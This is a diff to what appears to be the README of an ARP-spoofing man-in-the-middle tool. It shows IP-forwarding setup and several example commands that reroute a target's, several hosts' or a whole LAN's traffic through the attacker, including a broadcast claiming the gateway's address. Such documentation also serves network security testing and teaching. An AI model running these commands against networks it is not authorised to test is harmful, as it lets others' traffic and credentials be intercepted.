@@ -14,31 +14,41 @@ Setup:
 ```sh
 echo 1 >/proc/sys/net/ipv4/ip_forward
 echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects
+iptables -L FORWARD -vn
 ```
 
 **Example 1:**
+
+Redirects all traffic between the target '10.0.1.111' and the Internet through us.
 ```sh
 arpmitm -t 10.0.1.111
 ```
-The above redirects all traffic between the target '10.0.1.111' and the Internet through your computer.
 
-**Example 2:**
+Longer version doing exactly the same:
 ```sh
 arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 10.0.1.111:44:44:55:55:66:66
 ```
-A classic redirect. The above redirects all traffic between 10.0.1.254 and 10.0.1.111 through your computer. Where 10.0.1.254 is the default gateway then this makes it identical to Example 1. Example 1 finds out all the MAC's automatically.
+
+**Example 2:**
+
+Tells the gateway (10.0.1.254) to redirect all traffic to .111 and .222 via us (00:02:13:37:73:50). Traffic from .111 and .222 traffic towards the gaterway is _not_ redirected (-A).
+```sh
+arpmim -v -A 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 10.0.1.111 10.0.1.222
+```
 
 **Example 3:**
+
+Use 1 broadcast packet to tell *everyone* that 10.0.1.254 is us.
 ```sh
 arpmitm 00:02:13:37:73:50 255.255.255.255 10.0.1.254
 ```
-The above will use 1 broadcast packet to tell *everyone* that 10.0.1.254 is you now.
 
 **Example 4 the bold:**
+
+Redirect all local traffic between the 4 hosts through us.
 ```sh
 arpmitm -A 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4
 ```
-The above will redirect all local traffic between the 4 hosts through your computer.
 
 **Features:**
 - Auto-Mode
